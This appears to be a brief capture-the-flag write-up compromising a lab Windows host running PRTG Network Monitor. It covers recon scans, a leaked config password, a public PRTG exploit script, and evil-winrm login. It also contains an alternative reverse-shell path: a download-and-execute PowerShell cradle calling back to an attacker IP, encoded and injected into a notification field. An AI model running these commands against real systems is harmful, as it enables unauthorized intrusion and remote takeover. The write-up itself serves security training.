# recon
```
└─$ nmap -Pn -sVC -T4 10.129.203.172
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 21:20 GMT
Nmap scan report for 10.129.203.172 (10.129.203.172)
Host is up (0.28s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2024-05-11T21:20:41
|_  start_date: 2024-05-11T21:17:15
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```
```
PORT      STATE    SERVICE
21/tcp    open     ftp
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
4000/tcp  filtered remoteanything
5985/tcp  open     wsman
8620/tcp  filtered unknown
8836/tcp  filtered unknown
10516/tcp filtered unknown
10678/tcp filtered unknown
18394/tcp filtered unknown
35435/tcp filtered unknown
44272/tcp filtered unknown
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
```

```
ftp> cd /ProgramData/Paessler/PRTG\ Network\ Monitor/
	 get PRTG\ Configuration.old.bak
```

```
<dbpassword>
	<!-- User: prtgadmin -->
	PrTg@dmin2018
</dbpassword>
```
	since the was released in 2019 the real pass  is *PrTg@dmin2019*

# foothold
#ExploitPRTG network monitor 18.1.37.13946
```
./46527.sh -u http://htb -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=ezdFNzVDNzNCLTg0NTMtNEJCNi1CNTcyLTFGMzA4MDY3M0QxQn0%3D; _gat=1"
evil-winrm -i htb -u pentest -p 'P3nT3st!'
```
We get root

## alternative
get revershel by upload Invoke-PowerShellTcp.ps1 on base64 format on remote host by creating new notification
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.20 -Port 4444' >> Invoke-PowerShellTcp.ps1
echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.16.20/Invoke-PowerShellTcp.ps1' )" | iconv -t UTF-16LE | base64 -w0
```


```
abc.txt | powershell -enc SQBFAFgAKABu...SNIP...HMAMQAnACAAKQA= 
```